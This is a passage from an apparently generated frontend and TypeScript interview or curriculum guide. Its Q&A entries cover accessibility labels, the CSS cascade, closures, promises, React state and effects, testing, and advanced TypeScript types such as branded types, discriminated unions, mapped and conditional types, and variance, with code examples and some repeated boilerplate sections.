A visible placeholder disappears after typing and may not supply a durable accessible name. A label linked to the input remains available while an error message can be associated separately.

## Worked Case

A visible placeholder disappears after typing and may not supply a durable accessible name. A label linked to the input remains available while an error message can be associated separately.

## Risk

A visually polished page can still lack names, landmarks or keyboard-operable controls.

## Trade-off

Native semantics reduce custom interaction code and improve predictable behavior.

## Try This

Complete a form using only a keyboard and inspect its accessible names and error relationships.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do the CSS cascade, box model and layout systems determine the final page?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

The cascade resolves competing declarations through origin, importance, layers, specificity and order; layout then uses computed sizes and constraints. The box model distinguishes content, padding, border and margin. Flexbox distributes items primarily along one dimension, while grid arranges two-dimensional tracks. A child can overflow when an intrinsic minimum size exceeds the available track, even if the parent appears responsive. Inspect computed styles and container constraints before adding arbitrary fixed widths or hiding overflow.

## Why

A code block inside a grid cell may force horizontal page scrolling. Allow the cell to shrink with min-width:0 and keep the code block itself scrollable rather than clipping the text from users.

## Worked Case

A code block inside a grid cell may force horizontal page scrolling. Allow the cell to shrink with min-width:0 and keep the code block itself scrollable rather than clipping the text from users.

## Risk

Hiding overflow can conceal required content and keyboard focus.

## Trade-off

Flexible layouts need explicit content bounds and representative long-text checks.

## Try This

Diagnose a long-token overflow at a narrow viewport using computed widths.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do JavaScript closures and event listeners cause stale values or memory retention?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

A closure retains access to values in its lexical environment. An event listener remains reachable through its owner until removed or that owner is collected. Combining long-lived listeners with captured state can retain obsolete data or repeatedly act on a stale snapshot. Install listeners at a clear lifecycle boundary, remove them with the same registered function where required, and deliberately choose whether a handler needs the current state or the state when it was created. Garbage collection cannot free reachable listeners merely because their business task ended.

## Why

Navigating between views can install three resize handlers if each mount adds one and cleanup does nothing. All three may run, with older handlers referencing detached view state.

## Worked Case

Navigating between views can install three resize handlers if each mount adds one and cleanup does nothing. All three may run, with older handlers referencing detached view state.

## Risk

Duplicate handlers can create repeated effects and growing retained memory.

## Trade-off

Central event ownership simplifies cleanup; local handlers clarify view-specific behavior.

## Try This

Mount and unmount a view repeatedly and verify that one event triggers one current handler.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do promises, async/await and Promise.all handle failure?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

A promise represents eventual fulfillment or rejection; async/await makes sequencing explicit without removing those failure states. Promise.all rejects when one input rejects but does not automatically cancel the remaining operations. Promise.allSettled observes every outcome when partial results are meaningful. Decide which operations are independent, which share an effect boundary and which must be cancelled after failure. A catch handler should translate or recover from a known error, not silently convert every failure into successful empty data.

## Why

Three independent lookups can finish with two successes and one failure. A dashboard may show partial sections with explicit errors, whereas an all-or-nothing checkout cannot treat the same pattern as a successful complete transaction.

## Worked Case

Three independent lookups can finish with two successes and one failure. A dashboard may show partial sections with explicit errors, whereas an all-or-nothing checkout cannot treat the same pattern as a successful complete transaction.

## Risk

Rejected aggregation does not imply that sibling side effects stopped.

## Trade-off

Parallel work reduces waiting when independent; explicit sequencing preserves real dependencies.

## Try This

Demonstrate that a sibling operation still runs after Promise.all rejects.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How does TypeScript narrowing differ from runtime validation?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

TypeScript checks source-level assumptions and erases most type information during compilation. Narrowing uses control flow and discriminants to refine possible types inside the checked program. An external JSON response begins as an untrusted value even if a cast tells the compiler otherwise. Validate its shape and semantic fields before constructing trusted state. Use a discriminated union to represent meaningful states such as loading, ready and failed, so impossible combinations are harder to express. The server must still enforce its own contract.

## Why

Casting a response to User does not prove that response.name exists. A malformed response can reach rendering unless runtime validation rejects it and produces a visible error state.

## Worked Case

Casting a response to User does not prove that response.name exists. A malformed response can reach rendering unless runtime validation rejects it and produces a visible error state.

## Risk

Type assertions can silence the very boundary uncertainty the program needs to handle.

## Trade-off

Static types reduce internal mistakes; runtime parsers guard external representations.

## Try This

Parse unknown input into a success/error union without using an unchecked cast.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do React state, derived values and stable keys prevent inconsistent interfaces?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

State should store the minimal information needed to represent user intent and asynchronous results. Derive values that can be computed from current inputs instead of maintaining duplicate state that can disagree. React keys identify sibling elements across renders; a stable entity identity preserves the intended component association when lists reorder. Array-position keys can attach local state to the wrong item. State updates apply to render snapshots, so use an updater when the next value depends on the previous value.

## Why

Reordering editable rows keyed by array index can make one person's unsaved text appear under another person's name. A stable row identifier associates the local input state with the correct entity.

## Worked Case

Reordering editable rows keyed by array index can make one person's unsaved text appear under another person's name. A stable row identifier associates the local input state with the correct entity.

## Risk

Duplicated derived state can display a total inconsistent with its line items.

## Trade-off

Minimal state simplifies invariants; controlled local state supports explicit editing workflows.

## Try This

Reorder a list with an edited row and verify that its value follows the entity.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# When is a React effect necessary, and how should it clean up asynchronous work?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

An effect synchronizes a rendered component with an external system such as a subscription or network resource. Pure calculations belong in rendering or a deliberate memoized computation, and user-triggered effects often belong in event handlers. Cleanup should release subscriptions and invalidate obsolete asynchronous ownership. Aborting a fetch can save resources, while an identity or generation check also prevents an old completion from overwriting a newer view. Account for development lifecycle checks and avoid assuming setup runs exactly once forever.

## Why

A user changes from account A to B while A's response is delayed. The UI must not render A's result under B even if abort arrives too late to stop A's completion.

## Worked Case

A user changes from account A to B while A's response is delayed. The UI must not render A's result under B even if abort arrives too late to stop A's completion.

## Risk

Cancellation alone may not establish current-result ownership.

## Trade-off

Effects are useful for synchronization but add lifecycle and dependency obligations.

## Try This

Delay an old response and prove it cannot overwrite a newer account view.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do frontend tests distinguish visual appearance from usable behavior?

<!-- meta
answer_format: conceptual
domain: frontend
subdomain: frontend-foundations
difficulty: mechanism
review.status: draft
review.reviewer: Independent technical review pending
-->

## Answer

A screenshot records pixels for one state and viewport; it does not prove keyboard operation, correct accessible names, race handling or safe rendering of hostile text. Test the user-visible contract through real interactions where practical. Include loading, empty, error, cancellation and stale-response states, not only a successful populated view. Automated accessibility tools catch a useful subset of issues, while manual keyboard and assistive-technology review answer different questions. Keep assertions on meaningful outcomes rather than component internals.

## Why

A button may look enabled in a screenshot but be unreachable by keyboard or trigger the action twice. A browser interaction can verify focus, activation, disabled state and one accepted operation.

## Worked Case

A button may look enabled in a screenshot but be unreachable by keyboard or trigger the action twice. A browser interaction can verify focus, activation, disabled state and one accepted operation.

## Risk

Passing visual snapshots can coexist with inaccessible or incorrect interactions.

## Trade-off

Choose targeted behavioral checks and visual review according to the failure being prevented.

## Try This

Test submission using a keyboard and simulate a slow response followed by navigation.

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How does TypeScript differentiate structural typing from nominal typing, and how do you implement branded types?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript employs a structural type system (also known as duck typing or shape-based typing) where type compatibility and equivalence are determined solely by the shape and members of the type, rather than its explicit declaration name or class hierarchy. In nominal type systems (such as Java or C++), two classes with identical properties and methods are distinct and mutually unassignable unless related by explicit inheritance. In TypeScript, two types with identical shapes are completely interchangeable.

```typescript
// Structural equivalence
interface Point2D { x: number; y: number; }
interface Vector2D { x: number; y: number; }
let p: Point2D = { x: 10, y: 20 };
let v: Vector2D = p; // Valid under structural typing!

// Nominal simulation via Branded / Tagged Types:
declare const BrandSymbol: unique symbol;
type Brand<T, B> = T & { readonly [BrandSymbol]: B };

type USD = Brand<number, 'USD'>;
type EUR = Brand<number, 'EUR'>;
type UserId = Brand<string, 'UserId'>;

function makeUSD(n: number): USD { return n as USD; }
function makeEUR(n: number): EUR { return n as EUR; }

let walletUSD = makeUSD(100);
let invoiceEUR = makeEUR(100);
// walletUSD = invoiceEUR; // Compile Error! Type 'EUR' is not assignable to type 'USD'.
```

**Complexity analysis and mechanics:**
- **Compile-time cost:** Structural checks require recursive shape evaluation O(k) across properties during type checking.
- **Runtime overhead:** Exactly zero. Branded types use phantom properties erased during compilation to plain JavaScript.

**Algorithmic mechanics and edge cases:**
Branded types leverage intersection types with an unconstructible phantom property. Using `unique symbol` guarantees that no code can accidentally construct an object matching the brand tag without an explicit validation or smart constructor function. Edge cases include primitive boxing, serialization (where JSON.stringify strips symbols), and casting with `as` which bypasses brand checks if misused.

## Why

Structural typing enables flexible composition while branded types prevent dangerous unit and identity mixups.

## Worked Case

Walkthrough scenario: A financial ledger defines type USD = Brand<number, 'USD'> and EUR = Brand<number, 'EUR'>. A developer attempts to pass EUR payment of 50 to a transferUSD(amount: USD) function. The TypeScript compiler inspects the structural brand tag on BrandSymbol, detects mismatch between tag 'EUR' and 'USD', and emits error TS2322 at build time. Runtime data loss and currency conversion errors are prevented before code reaches production.

## Risk

Relying on raw primitives for distinct domain entities allows passing an unvalidated orderId to a userId parameter silently.

## Trade-off

Branded types enforce strict domain correctness at compile time at the cost of requiring explicit factory constructor functions.

## Try This

Compile code assigning a branded USD value to a function expecting EUR and verify compiler error TS2322 is emitted.

## Follow-ups

### Why does TypeScript use structural typing instead of nominal typing by default?

JavaScript idiomatic patterns rely heavily on anonymous object literals, duck typing, and dynamic property assignment, which structural typing models faithfully without inheritance boilerplate.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/objects.html
- https://www.typescriptlang.org/docs/handbook/type-compatibility.html

# How do discriminated unions and exhaustive never checks ensure complete pattern matching at compile time?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A discriminated union (or tagged union / algebraic data type) consists of object types that share a common literal discriminator property (such as `'kind'`, `'type'`, or `'status'`). When inspecting this property inside a conditional or switch statement, TypeScript's control-flow analysis narrows the union to the exact matching variant. An exhaustive check uses the bottom type `never` in the default case to ensure every variant is handled.

```typescript
interface FetchLoading { status: 'loading'; }
interface FetchSuccess { status: 'success'; data: string[]; }
interface FetchError   { status: 'error'; error: Error; }
type FetchState = FetchLoading | FetchSuccess | FetchError;

function assertNever(x: never): never {
    throw new Error(`Unhandled union variant: ${JSON.stringify(x)}`);
}

function renderState(state: FetchState): string {
    switch (state.status) {
        case 'loading': return 'Spinner...';
        case 'success': return `Items: ${state.data.join(', ')}`;
        case 'error':   return `Error: ${state.error.message}`;
        default:        return assertNever(state); // If a 4th status is added, compile error!
    }
}
```

**Complexity analysis and mechanics:**
- **Compile-time cost:** Narrowing is O(1) per branch using literal discriminator lookups.
- **Runtime overhead:** A standard JavaScript switch statement with single integer or string property comparisons.

**Algorithmic mechanics and edge cases:**
The `never` type represents an empty set of values. If all variants of a union are handled by case branches, the remaining type in the `default` branch is narrowed to `never`. If a developer later introduces a new variant (e.g., `FetchIdle`) without updating `renderState`, the variable in `default` will be of type `FetchIdle`, triggering compile error TS2345 because `FetchIdle` is not assignable to parameter type `never`.

## Why

Discriminated unions model mutually exclusive states accurately and eliminate impossible UI state combinations.

## Worked Case

Walkthrough scenario: An async state union contains loading, success, and error. An engineer introduces status 'idle' to support lazy initialization. In renderState, switch matches loading, success, and error. In default branch, state is inferred as type FetchIdle. The compiler evaluates assertNever(state: never) and raises compile error: Argument of type FetchIdle is not assignable to parameter of type never. The engineer is forced to add case 'idle' before build passes.

## Risk

Failing to implement exhaustive never checks allows newly added union states to silently fall through to default without handling.

## Trade-off

Discriminated unions require a shared literal property tag across all variant types but guarantee compile-time exhaustiveness.

## Try This

Add a new variant { status: 'idle' } to FetchState and verify that the TypeScript compiler immediately flags assertNever(state).

## Follow-ups

### Can boolean flags model multi-step async states safely without discriminated unions?

No, using separate boolean flags like isLoading, isSuccess, and isError permits 2^3 = 8 state permutations, including impossible states like isLoading=true and isSuccess=true simultaneously.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/narrowing.html#discriminated-unions
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html#the-never-type

# What are the exact semantic and type-safety differences between unknown, any, never, and void in TypeScript?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** These four special types occupy distinct positions in TypeScript's type lattice:
- `any`: The escape hatch / top-and-bottom type. It turns off all type checking, allowing arbitrary property accesses, calls, and assignments without validation.
- `unknown`: The type-safe top type. Any value can be assigned to `unknown`, but no operations can be performed on an `unknown` value until narrowed via type guards or assertions.
- `never`: The bottom type representing an empty set. No value (except `never` itself) can be assigned to `never`. It represents unreachable code or impossible states.
- `void`: The return type of a function that does not return an explicit useful value (evaluating to `undefined` at runtime).

```typescript
let valAny: any = 'hello';
valAny.foo.bar(); // Compiles without error! Fails at runtime with TypeError.

let valUnknown: unknown = 'hello';
// valUnknown.toUpperCase(); // Compile error TS18046: 'valUnknown' is of type 'unknown'.
if (typeof valUnknown === 'string') {
    console.log(valUnknown.toUpperCase()); // Safe! Narrowed to string.
}

function throwError(msg: string): never {
    throw new Error(msg); // Function never returns normal execution.
}

function logMessage(msg: string): void {
    console.log(msg); // Returns undefined
}
```

**Complexity analysis and mechanics:**
- **Type lattice hierarchy:** `unknown` is the universal supertype (top). `never` is the universal subtype (bottom). `any` bypasses the lattice entirely.
- **Compile-time cost:** `unknown` requires control flow narrowing checks; `any` eliminates type-checker passes for affected nodes.

**Algorithmic mechanics and edge cases:**
In function return types, a callback returning `void` can return a value that the caller simply ignores (e.g., `Array.prototype.forEach` callback). In contrast, a function returning `never` must never complete normally—it must throw an exception or loop indefinitely. Parsing untrusted external JSON should always produce `unknown`, never `any`.

## Why

Properly choosing unknown over any prevents contagious type unsafety across large enterprise codebases.

## Worked Case

Walkthrough scenario: An API helper decodes HTTP response text. With any, payload.user.name passes compiler checks even if backend renamed user to account, causing unhandled TypeError in production. Refactoring the helper to return unknown causes TypeScript to reject payload.user.name immediately. The team adds a Zod runtime validator verifying user.name before access, catching schema drift safely.

## Risk

Using any propagates through call chains silently, disabling compiler checks and converting compile-time errors into runtime production outages.

## Trade-off

unknown requires explicit runtime validation and narrowing logic before use, adding slight verbosity for guaranteed safety.

## Try This

Change JSON.parse return type from any to unknown in an API wrapper and observe compiler errors enforcing proper validation.

## Follow-ups

### Why is unknown preferred over any for deserializing external API payloads?

unknown forces developers to validate fields and types via schema validators or type predicates before access, ensuring runtime data matches compile-time assumptions.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/functions.html#unknown
- https://www.typescriptlang.org/docs/handbook/2/functions.html#never

# How do user-defined type guards and assertion functions validate unknown data safely at runtime?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** User-defined type guards use the return type syntax `value is TargetType`. When the function returns `true`, TypeScript's control flow analysis narrows the variable to `TargetType` in the truthy branch. Assertion functions use the syntax `asserts value is TargetType`, guaranteeing that if the function returns normally without throwing, the parameter is narrowed to `TargetType` for the remainder of the scope.

```typescript
interface UserAccount {
    id: string;
    email: string;
}

// Standard Type Guard:
function isUserAccount(obj: unknown): obj is UserAccount {
    return (
        typeof obj === 'object' &&
        obj !== null &&
        'id' in obj && typeof (obj as any).id === 'string' &&
        'email' in obj && typeof (obj as any).email === 'string'
    );
}

// Assertion Function:
function assertUserAccount(obj: unknown): asserts obj is UserAccount {
    if (!isUserAccount(obj)) {
        throw new TypeError('Invalid UserAccount payload');
    }
}

function processPayload(raw: unknown) {
    assertUserAccount(raw);
    console.log(raw.email.toLowerCase()); // raw is now strongly typed as UserAccount!
}
```

**Complexity analysis and mechanics:**
- **Runtime execution:** O(1) checks inspecting required properties and types at runtime.
- **Compile-time mechanics:** Updates the variable's type node within the current execution branch of the AST.

**Algorithmic mechanics and edge cases:**
The compiler trusts the implementation of a type predicate blindly. If the predicate contains a logic bug (e.g., checks `id` but forgets `email`), the compiler will narrow the variable to `UserAccount` regardless, introducing false safety. To guard against predicate bugs, teams often use battle-tested schema libraries (like Zod) whose generated predicates reflect comprehensive schema checks.

## Why

Type predicates and assertions bridge the gap between untrusted runtime JavaScript data and compile-time TypeScript guarantees.

## Worked Case

Walkthrough scenario: An event handler receives a message event with data of type unknown. Calling assertUserAccount(event.data) evaluates null checks, property existence, and string type checks. If data is an empty object, it throws TypeError immediately. If valid, the assertion returns normally, and subsequent lines access event.data.email with full auto-completion and zero compiler errors.

## Risk

Authoring incorrect type predicates creates a false sense of security where the compiler assumes properties exist that runtime data lacks.

## Trade-off

Custom predicates require manual runtime validation code; schema parsing libraries automate this at the expense of bundle size.

## Try This

Write an assertion function assertIsString(x: unknown): asserts x is string and test that non-strings throw while strings narrow.

## Follow-ups

### How do assertion functions differ from standard type guards in control flow?

Standard type guards return boolean and narrow only inside if/else branches, whereas assertion functions throw on failure and narrow all subsequent code in the outer scope.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/narrowing.html#using-type-predicates
- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-3-7.html#assertion-functions

# How do mapped types, keyof, and indexed access types transform object schemas programmatically?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Mapped types allow creating new types based on existing ones by iterating over property keys using the syntax `[K in Keys]`. When combined with the `keyof` operator (which extracts a union of property names) and indexed access types `T[K]` (which look up the value type at key `K`), developers can systematically apply modifiers like `readonly`, `?`, or value transformations across arbitrary schemas.

```typescript
interface User {
    id: number;
    name: string;
    email: string;
}

// Custom Readonly mapped type:
type MyReadonly<T> = {
    readonly [K in keyof T]: T[K];
};

// Custom Nullable mapped type with key remapping (as clause):
type NullableGetters<T> = {
    [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K] | null;
};

type UserGetters = NullableGetters<User>;
// Equivalent to:
// {
//   getId: () => number | null;
//   getName: () => string | null;
//   getEmail: () => string | null;
// }
```

**Complexity analysis and mechanics:**
- **Compile-time cost:** Mapped type generation scales linearly O(P) with the number of properties P in interface `T`.
- **Modifiers:** Prefixing with `+` or `-` explicitly adds or removes modifiers (e.g., `-readonly [K in keyof T]: T[K]`).

**Algorithmic mechanics and edge cases:**
Key remapping using `as` allows filtering keys out by mapping them to `never`. For instance, `[K in keyof T as T[K] extends Function ? never : K]: T[K]` strips all methods from an object, leaving only state properties. Edge cases include symbol keys, string indexing signatures (`[key: string]: any`), and optional property propagation.

## Why

Mapped types eliminate manual duplication of mirrored object schemas such as DTOs, getters, and partial updates.

## Worked Case

Walkthrough scenario: An enterprise service defines an entity User with 15 properties. A mutation API requires a patch DTO where every property is optional and readonly. Instead of duplicating the 15 properties, the engineer defines type PatchUser = { readonly [K in keyof User]?: User[K] }. When a new address field is added to User, PatchUser automatically incorporates address as optional and readonly without manual maintenance.

## Risk

Overly complex mapped type chains can severely degrade TypeScript compilation performance and IDE autocomplete responsiveness.

## Trade-off

Mapped types provide DRY, synchronized schema transformations but can produce cryptic compiler error messages when nested deeply.

## Try This

Implement a mapped type StrippedMethods<T> that maps function properties to never using an as clause and test it on a class interface.

## Follow-ups

### How do you strip the optional modifier from all properties using a mapped type?

Use the minus prefix on the question mark modifier: type Required<T> = { [K in keyof T]-?: T[K] }.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/mapped-types.html
- https://www.typescriptlang.org/docs/handbook/2/indexed-access-types.html

# How do conditional types and the infer keyword extract inner types from promises, functions, and arrays?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Conditional types select one of two possible types based on a type relationship test: `T extends U ? X : Y`. The `infer` keyword introduces a type variable within the `extends` clause that TypeScript's type inference engine deduces pattern-match style from the examined type structure.

```typescript
// Extract element type of an array:
type ElementOf<T> = T extends (infer E)[] ? E : never;
type Nums = ElementOf<number[]>; // number

// Unwrap Promise resolution type (recursively in modern TS):
type AwaitedType<T> = T extends Promise<infer R> ? AwaitedType<R> : T;
type Result = AwaitedType<Promise<Promise<string>>>; // string

// Extract function parameter types as a tuple:
type MyParameters<T extends (...args: any[]) => any> =
    T extends (...args: infer P) => any ? P : never;

// Extract return type:
type MyReturnType<T extends (...args: any[]) => any> =
    T extends (...args: any[]) => infer R ? R : any;

function createUser(name: string, age: number) { return { id: 1, name, age }; }
type CreateUserParams = MyParameters<typeof createUser>; // [name: string, age: number]
type CreateUserReturn = MyReturnType<typeof createUser>; // { id: number, name: string, age: number }
```

**Complexity analysis and mechanics:**
- **Pattern matching:** Unification pattern matching evaluates in O(1) during AST type checking.
- **Distributive property:** When `T` is a naked generic type parameter, conditional types distribute across unions (`(A | B) extends U ? X : Y => (A extends U ? X : Y) | (B extends U ? X : Y)`).

**Algorithmic mechanics and edge cases:**
If `infer` is used in multiple positions: multiple candidate types in co-variant positions (e.g. return types) yield a union, whereas multiple candidates in contra-variant positions (e.g. function arguments) yield an intersection. To prevent distributive evaluation across unions, wrap the arguments in tuples: `[T] extends [U] ? X : Y`.

## Why

Conditional types with infer unlock type extraction from external third-party libraries without requiring exported internal types.

## Worked Case

Walkthrough scenario: A developer uses a third-party analytics library that exports an executeQuery function but does not export the QueryResult interface. The developer writes type QueryData = MyReturnType<typeof executeQuery>. TypeScript pattern-matches the return position into inferred type variable R and resolves QueryData with complete property definitions and type safety.

## Risk

Unexpected distributive behavior on union types can yield unexpected union expansions if naked generics are not wrapped in tuples.

## Trade-off

Enables expressive type metaprogramming but increases cognitive overhead and compiler evaluation depth.

## Try This

Implement a conditional type UnpackPromise<T> using infer and test it against Promise<number> and plain string.

## Follow-ups

### How do you prevent a conditional type from distributing across union members?

Wrap both sides of the extends keyword in brackets to treat the union as a single tuple type: [T] extends [any] ? ... : ....

## Citations

- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html
- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#inferring-within-conditional-types

# How do you implement standard utility types like Pick, Omit, Partial, and ReturnType from scratch?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Standard utility types are implemented using combinations of mapped types, indexed access, `keyof`, `Exclude`, and conditional types with `infer`:

```typescript
// 1. Partial: make all properties optional
type MyPartial<T> = {
    [K in keyof T]?: T[K];
};

// 2. Pick: construct a type with subset of properties Keys
type MyPick<T, K extends keyof T> = {
    [P in K]: T[P];
};

// 3. Exclude: exclude from T those types that are assignable to U
type MyExclude<T, U> = T extends U ? never : T;

// 4. Omit: pick all properties except those specified in K
type MyOmit<T, K extends keyof any> = MyPick<T, MyExclude<keyof T, K>>;

// 5. ReturnType: extract return type of function type T
type MyReturnType<T extends (...args: any[]) => any> =
    T extends (...args: any[]) => infer R ? R : any;
```

**Complexity analysis and mechanics:**
- **Compile time:** `Pick` and `Partial` iterate over the requested keys O(K). `Exclude` distributes over union members O(N).
- **Type safety:** `K extends keyof T` in `Pick` guarantees at compile time that callers cannot pick non-existent properties.

**Algorithmic mechanics and edge cases:**
`MyOmit` uses `MyExclude<keyof T, K>` to filter out unwanted keys. `keyof any` evaluates to `string | number | symbol`, allowing `K` to contain keys that might not exist on `T` without triggering a constraint error. Understanding these primitives allows crafting custom enterprise utilities like `StrictOmit<T, K extends keyof T>` which rejects invalid property names.

## Why

Understanding how built-in utility types operate under the hood enables constructing custom domain-specific type transformations.

## Worked Case

Walkthrough scenario: An engineer implements user profile forms. The User interface has fields id, email, passwordHash, and createdAt. The registration form needs everything except id, passwordHash, and createdAt. Using MyOmit<User, 'id' | 'passwordHash' | 'createdAt'> evaluates MyExclude across the four keys, filtering down to 'email'. MyPick then constructs { email: string } automatically.

## Risk

Built-in Omit allows omitting arbitrary non-existent string keys without compiler error because its constraint is keyof any.

## Trade-off

Using utility types keeps code DRY but excessive nested compositions can slow down IDE type checking in large files.

## Try This

Implement StrictOmit<T, K extends keyof T> and verify that attempting to omit a non-existent property throws a compile error.

## Follow-ups

### Why does MyExclude rely on distributive conditional types?

When T is a union, T extends U tests each member individually. If a member matches U, it evaluates to never, which vanishes from the resulting union.

## Citations

- https://www.typescriptlang.org/docs/handbook/utility-types.html
- https://www.typescriptlang.org/docs/handbook/2/types-from-types.html

# How does template literal typing enable type-safe string manipulation, route matching, and event names?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Template literal types build on string literal types, allowing developers to construct complex string types using template string syntax `${Prefix}_${Suffix}`. When paired with unions, template literal types produce Cartesian products of all combinations. When paired with conditional types and `infer`, they parse, validate, and extract parameters from route strings or event patterns at compile time.

```typescript
// 1. Cartesian product of event types:
type Scope = 'user' | 'order';
type Action = 'created' | 'updated' | 'deleted';
type AppEvent = `${Scope}:${Action}`;
// AppEvent is 'user:created' | 'user:updated' | ... (6 combinations)

// 2. Type-safe URL route parameter extraction:
type ExtractRouteParams<T extends string> =
    T extends `${string}:${infer Param}/${infer Rest}`
        ? { [K in Param | keyof ExtractRouteParams<Rest>]: string }
        : T extends `${string}:${infer Param}`
            ? { [K in Param]: string }
            : {};

type RouteParams = ExtractRouteParams<'/org/:orgId/user/:userId'>;
// Resolved RouteParams: { orgId: string; userId: string }

function navigate<T extends string>(route: T, params: ExtractRouteParams<T>) {
    console.log(route, params);
}
navigate('/org/:orgId/user/:userId', { orgId: 'acme', userId: 'usr_42' }); // Type-safe!
```

**Complexity analysis and mechanics:**
- **Combinatorial complexity:** Multiplying N options by M options expands to O(N * M) string literals in the type union.
- **Compile limits:** TypeScript imposes a hard limit (typically 100,000) on union components to prevent out-of-memory compiler crashes.

**Algorithmic mechanics and edge cases:**
Built-in intrinsic string manipulation types (`Uppercase<S>`, `Lowercase<S>`, `Capitalize<S>`, `Uncapitalize<S>`) operate directly on string literal types inside template strings. Recursive route extractors must account for trailing slashes, empty parameters, and wildcards.

## Why

Template literal types eliminate runtime typos in event emission, CSS utility classes, and URL parameter mapping.

## Worked Case

Walkthrough scenario: An engineering team maintains a single-page app router. Previously, navigate('/user/:id', { id: '123' }) allowed passing wrong parameter names like { userId: '123' } causing runtime routing bugs. Using ExtractRouteParams<T>, passing { userId: '123' } immediately causes compile error TS2345: Property 'id' is missing in type '{ userId: string }'. Autocomplete guides the engineer correctly.

## Risk

Creating template literals from large unions (e.g. 100 x 100) causes exponential union explosion and crashes the TypeScript compiler.

## Trade-off

Provides unprecedented string-level type safety for routing and events at the expense of potential compiler slowdowns on huge sets.

## Try This

Write a type CamelToKebab<S extends string> using template literals and infer and verify it transforms 'fontSize' to 'font-size'.

## Follow-ups

### What are the four built-in string manipulation utility types provided by TypeScript?

Uppercase<StringType>, Lowercase<StringType>, Capitalize<StringType>, and Uncapitalize<StringType>.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html
- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-1.html#template-literal-types

# How do covariance, contravariance, and bivariance govern function parameter and return type assignability?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Variance describes how subtyping between more complex types relates to subtyping between their component types:
- **Covariance (same direction):** If `Dog` is a subtype of `Animal`, then `() => Dog` is assignable to `() => Animal` (functions returning a more specific type can be used where a less specific return is expected).
- **Contravariance (reverse direction):** If `Dog` is a subtype of `Animal`, then `(x: Animal) => void` is assignable to `(x: Dog) => void` (a function capable of handling any `Animal` can safely handle a `Dog`).
